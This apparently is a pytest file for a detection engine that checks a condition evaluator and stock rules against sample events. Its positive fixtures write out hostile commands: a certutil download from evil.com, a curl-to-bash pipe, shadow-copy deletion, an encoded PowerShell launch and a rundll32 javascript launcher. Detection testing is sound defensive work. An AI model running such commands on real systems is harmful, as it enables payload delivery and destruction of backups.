"""
Unit Tests: AST Condition Evaluation & Positive/Negative Matching for all 18 Defensive Rules
"""
import uuid

from app.engine.detector import Detector
from app.engine.rules import (
    evaluate_condition,
    validate_condition_ast,
)
from app.models.event import TelemetryEventModel


def test_ast_evaluator_operators():
    """Test AST condition evaluator with various operators and combinations."""
    event = {
        "actor": {
            "name": "powershell.exe",
            "pid": 1337,
            "cmdline": "powershell.exe -enc SQBFAFgA",
        },
        "target": {
            "identifier": "C:\\Windows\\System32\\cmd.exe",
        },
        "details": {
            "remote_port": 4444,
            "count": 25,
        },
    }

    # Equals
    assert evaluate_condition({"field": "actor.name", "operator": "equals", "value": "powershell.exe"}, event)
    assert not evaluate_condition({"field": "actor.name", "operator": "equals", "value": "cmd.exe"}, event)

    # In List
    assert evaluate_condition({"field": "actor.name", "operator": "in", "value": ["powershell.exe", "pwsh"]}, event)
    assert not evaluate_condition({"field": "actor.name", "operator": "in", "value": ["bash", "sh"]}, event)

    # Contains
    assert evaluate_condition({"field": "actor.cmdline", "operator": "contains", "value": "-enc"}, event)
    assert not evaluate_condition({"field": "actor.cmdline", "operator": "contains", "value": "-noprofile"}, event)

    # Regex
    assert evaluate_condition({"field": "actor.cmdline", "operator": "regex", "value": "(?i)-enc\\s+[A-Za-z0-9+/=]+"}, event)
    assert not evaluate_condition({"field": "actor.cmdline", "operator": "regex", "value": "^curl"}, event)

    # Numeric Bounds
    assert evaluate_condition({"field": "details.remote_port", "operator": "equals", "value": 4444}, event)
    assert evaluate_condition({"field": "details.count", "operator": "gt", "value": 20}, event)
    assert evaluate_condition({"field": "details.count", "operator": "lt", "value": 30}, event)

    # Nested AND, OR, NOT
    and_cond = {
        "and": [
            {"field": "actor.name", "operator": "equals", "value": "powershell.exe"},
            {"field": "details.remote_port", "operator": "equals", "value": 4444},
        ]
    }
    assert evaluate_condition(and_cond, event)

    or_cond = {
        "or": [
            {"field": "actor.name", "operator": "equals", "value": "nonexistent.exe"},
            {"field": "details.count", "operator": "gt", "value": 10},
        ]
    }
    assert evaluate_condition(or_cond, event)

    not_cond = {
        "not": {"field": "actor.name", "operator": "equals", "value": "bash"}
    }
    assert evaluate_condition(not_cond, event)


def test_ast_malformed_conditions():
    """Verify that malformed conditions fail safely without throwing exceptions."""
    event = {"actor": {"name": "test"}}
    assert not evaluate_condition({}, event)
    assert not evaluate_condition({"field": "missing.field", "operator": "equals", "value": "foo"}, event)
    assert not evaluate_condition({"field": "actor.name", "operator": "invalid_op", "value": "test"}, event)
    assert not evaluate_condition({"field": "actor.name", "operator": "regex", "value": "[unclosed"}, event)


def test_rule_catalog_validation():
    """Verify all 18 stock rules on disk are structurally and semantically valid."""
    detector = Detector()
    disk_rules = detector.load_rules_from_disk()

    assert len(disk_rules) >= 18, f"Expected at least 18 rules, found {len(disk_rules)}"

    required_keys = {"id", "name", "description", "severity", "category", "source", "match_conditions", "explanation"}
    rule_ids = set()

    for r in disk_rules:
        missing = required_keys - set(r.keys())
        assert not missing, f"Rule {r.get('id')} missing keys: {missing}"
        rule_ids.add(r["id"])

        is_valid, err = validate_condition_ast(r["match_conditions"])
        assert is_valid, f"Rule {r['id']} has invalid condition: {err}"

    # Verify all expected 18 IDs are present
    expected_ids = {
        "AGNI-R-PROC-001", "AGNI-R-PROC-002", "AGNI-R-PROC-003", "AGNI-R-PROC-004",
        "AGNI-R-PROC-005", "AGNI-R-PROC-006", "AGNI-R-PROC-007", "AGNI-R-PROC-008",
        "AGNI-R-FIM-001", "AGNI-R-FIM-002", "AGNI-R-FIM-003", "AGNI-R-FIM-004",
        "AGNI-R-NET-001", "AGNI-R-NET-002", "AGNI-R-NET-003",
        "AGNI-R-PERS-001", "AGNI-R-PERS-002", "AGNI-R-PERS-003",
    }
    assert expected_ids.issubset(rule_ids), f"Missing rules: {expected_ids - rule_ids}"


# -----------------------------------------------------------------------------
# Positive and Negative Testing Across All 18 Rules
# -----------------------------------------------------------------------------

def test_rule_proc_001_powershell(test_db):
    """AGNI-R-PROC-001: Encoded PowerShell Command Execution."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    # Positive event
    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="High",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="powershell.exe",
        actor_cmdline="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-001" for a in alerts)

    # Negative event (plain powershell script)
    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="powershell.exe",
        actor_cmdline="powershell.exe -File C:\\Scripts\\backup.ps1",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-001" for a in neg_alerts)


def test_rule_proc_002_certutil(test_db):
    """AGNI-R-PROC-002: Certutil Suspicious Remote Download / Decode."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="High",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="certutil.exe",
        actor_cmdline="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-002" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="certutil.exe",
        actor_cmdline="certutil.exe -verify C:\\Certs\\ca.cer",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-002" for a in neg_alerts)


def test_rule_proc_003_vssadmin(test_db):
    """AGNI-R-PROC-003: Shadow Copy Deletion Attempt via Vssadmin."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Critical",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="vssadmin.exe",
        actor_cmdline="vssadmin.exe delete shadows /all /quiet",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-003" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="vssadmin.exe",
        actor_cmdline="vssadmin.exe list shadows",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-003" for a in neg_alerts)


def test_rule_proc_004_temp_binary(test_db):
    """AGNI-R-PROC-004: Suspicious Binary Execution from Temporary Directory."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Medium",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="malware.exe",
        actor_path="C:\\Users\\Bob\\AppData\\Local\\Temp\\malware.exe",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-004" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="notepad.exe",
        actor_path="C:\\Windows\\System32\\notepad.exe",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-004" for a in neg_alerts)


def test_rule_proc_006_double_extension(test_db):
    """AGNI-R-PROC-006: Double Extension Executable Execution."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="High",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="invoice.pdf.exe",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-006" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="invoice.pdf",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-006" for a in neg_alerts)


def test_rule_proc_007_rundll32(test_db):
    """AGNI-R-PROC-007: Rundll32 Executing Remote or Script Protocol."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="High",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="rundll32.exe",
        actor_cmdline="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-007" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="PC01",
        os_name="Windows",
        actor_name="rundll32.exe",
        actor_cmdline="rundll32.exe shell32.dll,Control_RunDLL",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-007" for a in neg_alerts)


def test_rule_proc_008_pipe_to_shell(test_db):
    """AGNI-R-PROC-008: Pipe to Shell Execution."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Medium",
        source="agni_core",
        hostname="Ubuntu01",
        os_name="Linux",
        actor_name="bash",
        actor_cmdline="curl -sSL http://evil.sh | bash",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PROC-008" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="process",
        action="spawned",
        severity="Low",
        source="agni_core",
        hostname="Ubuntu01",
        os_name="Linux",
        actor_name="bash",
        actor_cmdline="bash ./deploy.sh",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-PROC-008" for a in neg_alerts)


def test_rule_fim_001_hosts_file(test_db):
    """AGNI-R-FIM-001: System Hosts File Modification."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="file_integrity",
        action="modified",
        severity="High",
        source="fim",
        hostname="PC01",
        os_name="Windows",
        target_type="file",
        target_identifier=r"C:\Windows\System32\drivers\etc\hosts",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-FIM-001" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="file_integrity",
        action="modified",
        severity="Low",
        source="fim",
        hostname="PC01",
        os_name="Windows",
        target_type="file",
        target_identifier=r"C:\Users\Bob\Documents\notes.txt",
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-FIM-001" for a in neg_alerts)


def test_rule_fim_002_critical_binary(test_db):
    """AGNI-R-FIM-002: Critical System Binary Integrity Violation."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="file_integrity",
        action="modified",
        severity="Critical",
        source="fim",
        hostname="Ubuntu01",
        os_name="Linux",
        target_identifier="/usr/bin/sudo",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-FIM-002" for a in alerts)


def test_rule_fim_003_ssh_keys(test_db):
    """AGNI-R-FIM-003: SSH Authorized Keys File Alteration."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="file_integrity",
        action="modified",
        severity="High",
        source="fim",
        hostname="Ubuntu01",
        os_name="Linux",
        target_identifier="/home/user/.ssh/authorized_keys",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-FIM-003" for a in alerts)


def test_rule_fim_004_config_deletion(test_db):
    """AGNI-R-FIM-004: Critical Configuration File Deletion."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="file_integrity",
        action="deleted",
        severity="Medium",
        source="fim",
        hostname="PC01",
        os_name="Windows",
        target_identifier="C:\\App\\config.yaml",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-FIM-004" for a in alerts)


def test_rule_net_001_reverse_shell_port(test_db):
    """AGNI-R-NET-001: Outbound Connection to Known Reverse Shell / C2 Port."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="network",
        action="connected",
        severity="High",
        source="vayu",
        hostname="PC01",
        os_name="Windows",
        actor_pid=2000,
        actor_name="cmd.exe",
        details={"remote_port": 4444},
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-NET-001" for a in alerts)

    neg_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="network",
        action="connected",
        severity="Low",
        source="vayu",
        hostname="PC01",
        os_name="Windows",
        actor_pid=2000,
        actor_name="chrome.exe",
        details={"remote_port": 443},
    )
    neg_alerts = detector.process_event(test_db, neg_event)
    assert not any(a.rule_id == "AGNI-R-NET-001" for a in neg_alerts)


def test_rule_net_002_lolbin_socket(test_db):
    """AGNI-R-NET-002: LOLBin Outbound Network Connection."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="network",
        action="connected",
        severity="Medium",
        source="vayu",
        hostname="PC01",
        os_name="Windows",
        actor_name="certutil.exe",
        details={"status": "ESTABLISHED"},
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-NET-002" for a in alerts)


def test_rule_pers_001_run_key(test_db):
    """AGNI-R-PERS-001: Windows Registry Run Key Persistence Added."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="persistence",
        action="created",
        severity="High",
        source="persistence",
        hostname="PC01",
        os_name="Windows",
        target_identifier=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PERS-001" for a in alerts)


def test_rule_pers_002_startup_dropped(test_db):
    """AGNI-R-PERS-002: Startup Folder Shortcut / Executable Dropped."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="persistence",
        action="created",
        severity="High",
        source="persistence",
        hostname="PC01",
        os_name="Windows",
        target_identifier=r"C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.lnk",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PERS-002" for a in alerts)


def test_rule_pers_003_systemd_launchd(test_db):
    """AGNI-R-PERS-003: New Systemd Service or LaunchAgent Created."""
    detector = Detector()
    detector.sync_rules_to_db(test_db)

    pos_event = TelemetryEventModel(
        id=str(uuid.uuid4()),
        category="persistence",
        action="created",
        severity="High",
        source="persistence",
        hostname="Ubuntu01",
        os_name="Linux",
        target_identifier="/etc/systemd/system/backdoor.service",
    )
    alerts = detector.process_event(test_db, pos_event)
    assert any(a.rule_id == "AGNI-R-PERS-003" for a in alerts)
